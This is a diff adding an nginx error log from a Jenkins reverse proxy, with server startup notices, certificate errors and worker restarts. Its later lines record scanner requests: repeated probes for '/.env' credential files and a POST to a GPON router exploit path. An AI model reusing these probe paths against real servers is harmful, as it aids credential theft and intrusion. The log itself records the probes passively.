@@ -1,0 +1,1201 @@
+2024/04/13 15:41:09 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:37
+2024/04/13 15:41:09 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:38
+2024/04/13 15:41:09 [notice] 1#1: using the "epoll" event method
+2024/04/13 15:41:09 [notice] 1#1: nginx/1.25.4
+2024/04/13 15:41:09 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/13 15:41:09 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/13 15:41:09 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/13 15:41:09 [notice] 1#1: start worker processes
+2024/04/13 15:41:09 [notice] 1#1: start worker process 19
+2024/04/13 15:41:09 [notice] 1#1: start worker process 20
+2024/04/13 15:41:59 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/13 15:41:59 [notice] 19#19: gracefully shutting down
+2024/04/13 15:41:59 [notice] 20#20: gracefully shutting down
+2024/04/13 15:41:59 [notice] 20#20: exiting
+2024/04/13 15:41:59 [notice] 20#20: exit
+2024/04/13 15:41:59 [notice] 19#19: exiting
+2024/04/13 15:41:59 [notice] 19#19: exit
+2024/04/13 15:41:59 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/13 15:41:59 [notice] 1#1: worker process 20 exited with code 0
+2024/04/13 15:41:59 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/13 15:41:59 [notice] 1#1: signal 17 (SIGCHLD) received from 19
+2024/04/13 15:41:59 [notice] 1#1: worker process 19 exited with code 0
+2024/04/13 15:41:59 [notice] 1#1: exit
+2024/04/13 15:43:37 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:37
+2024/04/13 15:43:37 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:38
+2024/04/13 15:43:37 [emerg] 1#1: cannot load certificate "/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem": BIO_new_file() failed (SSL: error:80000002:system library::No such file or directory:calling fopen(/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem, r) error:10000080:BIO routines::no such file)
+2024/04/13 15:43:39 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:37
+2024/04/13 15:43:39 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:38
+2024/04/13 15:43:39 [emerg] 1#1: cannot load certificate "/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem": BIO_new_file() failed (SSL: error:80000002:system library::No such file or directory:calling fopen(/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem, r) error:10000080:BIO routines::no such file)
+2024/04/13 15:43:40 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:37
+2024/04/13 15:43:40 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:38
+2024/04/13 15:43:40 [emerg] 1#1: cannot load certificate "/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem": BIO_new_file() failed (SSL: error:80000002:system library::No such file or directory:calling fopen(/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem, r) error:10000080:BIO routines::no such file)
+2024/04/13 15:43:41 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:37
+2024/04/13 15:43:41 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:38
+2024/04/13 15:43:41 [emerg] 1#1: cannot load certificate "/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem": BIO_new_file() failed (SSL: error:80000002:system library::No such file or directory:calling fopen(/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem, r) error:10000080:BIO routines::no such file)
+2024/04/13 15:43:43 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:37
+2024/04/13 15:43:43 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:38
+2024/04/13 15:43:43 [emerg] 1#1: cannot load certificate "/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem": BIO_new_file() failed (SSL: error:80000002:system library::No such file or directory:calling fopen(/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem, r) error:10000080:BIO routines::no such file)
+2024/04/13 15:43:46 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:37
+2024/04/13 15:43:46 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:38
+2024/04/13 15:43:46 [emerg] 1#1: cannot load certificate "/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem": BIO_new_file() failed (SSL: error:80000002:system library::No such file or directory:calling fopen(/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem, r) error:10000080:BIO routines::no such file)
+2024/04/13 15:43:50 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:37
+2024/04/13 15:43:50 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:38
+2024/04/13 15:43:50 [emerg] 1#1: cannot load certificate "/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem": BIO_new_file() failed (SSL: error:80000002:system library::No such file or directory:calling fopen(/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem, r) error:10000080:BIO routines::no such file)
+2024/04/13 15:43:57 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:37
+2024/04/13 15:43:57 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/http.conf:38
+2024/04/13 15:43:57 [emerg] 1#1: cannot load certificate "/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem": BIO_new_file() failed (SSL: error:80000002:system library::No such file or directory:calling fopen(/etc/letsencrypt/live/jenkins.thanhtha.name.vn/fullchain.pem, r) error:10000080:BIO routines::no such file)
+2024/04/13 15:45:20 [notice] 1#1: using the "epoll" event method
+2024/04/13 15:45:20 [notice] 1#1: nginx/1.25.4
+2024/04/13 15:45:20 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/13 15:45:20 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/13 15:45:20 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/13 15:45:20 [notice] 1#1: start worker processes
+2024/04/13 15:45:20 [notice] 1#1: start worker process 29
+2024/04/13 15:45:20 [notice] 1#1: start worker process 30
+2024/04/13 15:46:38 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/13 15:46:38 [notice] 30#30: gracefully shutting down
+2024/04/13 15:46:38 [notice] 29#29: gracefully shutting down
+2024/04/13 15:46:38 [notice] 30#30: exiting
+2024/04/13 15:46:38 [notice] 29#29: exiting
+2024/04/13 15:46:38 [notice] 30#30: exit
+2024/04/13 15:46:38 [notice] 29#29: exit
+2024/04/13 15:46:38 [notice] 1#1: signal 17 (SIGCHLD) received from 30
+2024/04/13 15:46:38 [notice] 1#1: worker process 30 exited with code 0
+2024/04/13 15:46:38 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/13 15:46:38 [notice] 1#1: signal 17 (SIGCHLD) received from 29
+2024/04/13 15:46:38 [notice] 1#1: worker process 29 exited with code 0
+2024/04/13 15:46:38 [notice] 1#1: exit
+2024/04/13 15:47:08 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/jenkins.conf:37
+2024/04/13 15:47:08 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/jenkins.conf:38
+2024/04/13 15:47:08 [notice] 1#1: using the "epoll" event method
+2024/04/13 15:47:08 [notice] 1#1: nginx/1.25.4
+2024/04/13 15:47:08 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/13 15:47:08 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/13 15:47:08 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/13 15:47:08 [notice] 1#1: start worker processes
+2024/04/13 15:47:08 [notice] 1#1: start worker process 20
+2024/04/13 15:47:08 [notice] 1#1: start worker process 21
+2024/04/13 15:47:36 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/13 15:47:36 [notice] 21#21: gracefully shutting down
+2024/04/13 15:47:36 [notice] 21#21: exiting
+2024/04/13 15:47:36 [notice] 20#20: gracefully shutting down
+2024/04/13 15:47:36 [notice] 20#20: exiting
+2024/04/13 15:47:36 [notice] 21#21: exit
+2024/04/13 15:47:36 [notice] 20#20: exit
+2024/04/13 15:47:36 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/13 15:47:36 [notice] 1#1: worker process 20 exited with code 0
+2024/04/13 15:47:36 [notice] 1#1: worker process 21 exited with code 0
+2024/04/13 15:47:36 [notice] 1#1: exit
+2024/04/13 15:48:04 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/jenkins.conf:37
+2024/04/13 15:48:04 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/jenkins.conf:38
+2024/04/13 15:48:04 [notice] 1#1: using the "epoll" event method
+2024/04/13 15:48:04 [notice] 1#1: nginx/1.25.4
+2024/04/13 15:48:04 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/13 15:48:04 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/13 15:48:04 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/13 15:48:04 [notice] 1#1: start worker processes
+2024/04/13 15:48:04 [notice] 1#1: start worker process 20
+2024/04/13 15:48:04 [notice] 1#1: start worker process 21
+2024/04/13 15:53:48 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/13 15:53:48 [notice] 21#21: gracefully shutting down
+2024/04/13 15:53:48 [notice] 21#21: exiting
+2024/04/13 15:53:48 [notice] 21#21: exit
+2024/04/13 15:53:48 [notice] 20#20: gracefully shutting down
+2024/04/13 15:53:48 [notice] 20#20: exiting
+2024/04/13 15:53:48 [notice] 20#20: exit
+2024/04/13 15:53:48 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/13 15:53:48 [notice] 1#1: worker process 21 exited with code 0
+2024/04/13 15:53:48 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/13 15:53:48 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/13 15:53:48 [notice] 1#1: worker process 20 exited with code 0
+2024/04/13 15:53:48 [notice] 1#1: exit
+2024/04/13 15:54:59 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/jenkins.conf:37
+2024/04/13 15:54:59 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/jenkins.conf:38
+2024/04/13 15:54:59 [notice] 1#1: using the "epoll" event method
+2024/04/13 15:54:59 [notice] 1#1: nginx/1.25.4
+2024/04/13 15:54:59 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/13 15:54:59 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/13 15:54:59 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/13 15:54:59 [notice] 1#1: start worker processes
+2024/04/13 15:54:59 [notice] 1#1: start worker process 19
+2024/04/13 15:54:59 [notice] 1#1: start worker process 20
+2024/04/13 15:57:08 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/13 15:57:08 [notice] 20#20: gracefully shutting down
+2024/04/13 15:57:08 [notice] 19#19: gracefully shutting down
+2024/04/13 15:57:08 [notice] 20#20: exiting
+2024/04/13 15:57:08 [notice] 19#19: exiting
+2024/04/13 15:57:08 [notice] 20#20: exit
+2024/04/13 15:57:08 [notice] 19#19: exit
+2024/04/13 15:57:08 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/13 15:57:08 [notice] 1#1: worker process 20 exited with code 0
+2024/04/13 15:57:08 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/13 15:57:08 [notice] 1#1: signal 17 (SIGCHLD) received from 19
+2024/04/13 15:57:08 [notice] 1#1: worker process 19 exited with code 0
+2024/04/13 15:57:08 [notice] 1#1: exit
+2024/04/13 15:57:50 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/jenkins.conf:37
+2024/04/13 15:57:50 [warn] 1#1: the "listen ... http2" directive is deprecated, use the "http2" directive instead in /etc/nginx/conf.d/jenkins.conf:38
+2024/04/13 15:57:50 [notice] 1#1: using the "epoll" event method
+2024/04/13 15:57:50 [notice] 1#1: nginx/1.25.4
+2024/04/13 15:57:50 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/13 15:57:50 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/13 15:57:50 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/13 15:57:50 [notice] 1#1: start worker processes
+2024/04/13 15:57:50 [notice] 1#1: start worker process 20
+2024/04/13 15:57:50 [notice] 1#1: start worker process 21
+2024/04/13 15:57:50 [error] 20#20: *1 recv() failed (104: Connection reset by peer) while reading response header from upstream, client: 42.119.228.103, server: jenkins.thanhtha.name.vn, request: "GET /login?from=%2F HTTP/2.0", upstream: "http://61.14.234.55:8080/login?from=%2F", host: "jenkins.thanhtha.name.vn", referrer: "https://jenkins.thanhtha.name.vn/"
+2024/04/13 16:12:51 [notice] 1#1: using the "epoll" event method
+2024/04/13 16:12:51 [notice] 1#1: nginx/1.25.4
+2024/04/13 16:12:51 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/13 16:12:51 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/13 16:12:51 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/13 16:12:51 [notice] 1#1: start worker processes
+2024/04/13 16:12:51 [notice] 1#1: start worker process 19
+2024/04/13 16:12:51 [notice] 1#1: start worker process 20
+2024/04/13 16:25:40 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/13 16:25:40 [notice] 20#20: gracefully shutting down
+2024/04/13 16:25:40 [notice] 19#19: gracefully shutting down
+2024/04/13 16:25:40 [notice] 19#19: exiting
+2024/04/13 16:25:40 [notice] 20#20: exiting
+2024/04/13 16:25:40 [notice] 20#20: exit
+2024/04/13 16:25:40 [notice] 19#19: exit
+2024/04/13 16:25:40 [notice] 1#1: signal 17 (SIGCHLD) received from 19
+2024/04/13 16:25:40 [notice] 1#1: worker process 19 exited with code 0
+2024/04/13 16:25:40 [notice] 1#1: worker process 20 exited with code 0
+2024/04/13 16:25:40 [notice] 1#1: exit
+2024/04/13 16:25:45 [notice] 1#1: using the "epoll" event method
+2024/04/13 16:25:45 [notice] 1#1: nginx/1.25.4
+2024/04/13 16:25:45 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/13 16:25:45 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/13 16:25:45 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/13 16:25:45 [notice] 1#1: start worker processes
+2024/04/13 16:25:45 [notice] 1#1: start worker process 19
+2024/04/13 16:25:45 [notice] 1#1: start worker process 20
+2024/04/13 17:13:34 [error] 19#19: *83 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 17:14:51 [error] 20#20: *84 open() "/etc/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 115.50.92.121, server: jenkins.thanhtha.name.vn, request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
+2024/04/13 17:29:43 [error] 19#19: *88 open() "/etc/nginx/html/cdn-cgi/trace" failed (2: No such file or directory), client: 34.123.202.173, server: jenkins.thanhtha.name.vn, request: "GET /cdn-cgi/trace HTTP/1.1", host: "cloudflaremirrors.com"
+2024/04/13 17:58:30 [error] 19#19: *91 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 17:58:31 [error] 19#19: *92 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:04:02 [error] 19#19: *93 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:04:02 [error] 19#19: *94 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:11:03 [error] 19#19: *96 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.145.53, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 18:11:07 [error] 19#19: *97 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.145.53, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:21:26 [error] 19#19: *99 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 18:21:57 [error] 19#19: *100 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:21:58 [error] 19#19: *101 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:24:30 [error] 19#19: *102 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:24:30 [error] 19#19: *103 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:26:09 [error] 19#19: *104 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:26:09 [error] 19#19: *105 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:27:58 [error] 20#20: *106 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:27:58 [error] 20#20: *107 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:33:49 [error] 20#20: *108 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:33:49 [error] 20#20: *109 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:34:16 [error] 20#20: *110 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:34:17 [error] 20#20: *111 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:38:25 [error] 20#20: *114 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:38:25 [error] 20#20: *115 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:38:46 [error] 20#20: *116 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:38:47 [error] 20#20: *117 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:51:44 [error] 20#20: *119 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.177, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:52:24 [error] 20#20: *121 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:52:24 [error] 20#20: *122 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:52:25 [error] 20#20: *123 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:52:25 [error] 19#19: *124 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:52:46 [error] 19#19: *125 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:52:47 [error] 19#19: *126 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:54:48 [error] 19#19: *127 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:54:48 [error] 19#19: *128 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:58:31 [error] 19#19: *129 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 18:58:32 [error] 19#19: *130 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:00:46 [error] 19#19: *131 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:00:47 [error] 19#19: *132 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:03:43 [error] 19#19: *133 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:03:43 [error] 19#19: *134 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:04:23 [error] 19#19: *135 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:04:24 [error] 19#19: *136 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:07:54 [error] 19#19: *137 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:08:22 [error] 19#19: *138 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:08:22 [error] 19#19: *139 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:08:42 [error] 20#20: *140 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:08:42 [error] 20#20: *141 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:12:16 [error] 20#20: *142 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:12:16 [error] 20#20: *143 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:12:34 [error] 20#20: *144 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:12:35 [error] 20#20: *145 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:14:45 [error] 20#20: *146 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:14:46 [error] 20#20: *147 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:16:03 [error] 20#20: *148 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 159.65.27.209, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:20:37 [error] 20#20: *154 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:20:38 [error] 20#20: *155 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:23:26 [error] 20#20: *156 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:23:27 [error] 20#20: *157 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:23:59 [error] 20#20: *158 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:24:00 [error] 20#20: *159 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
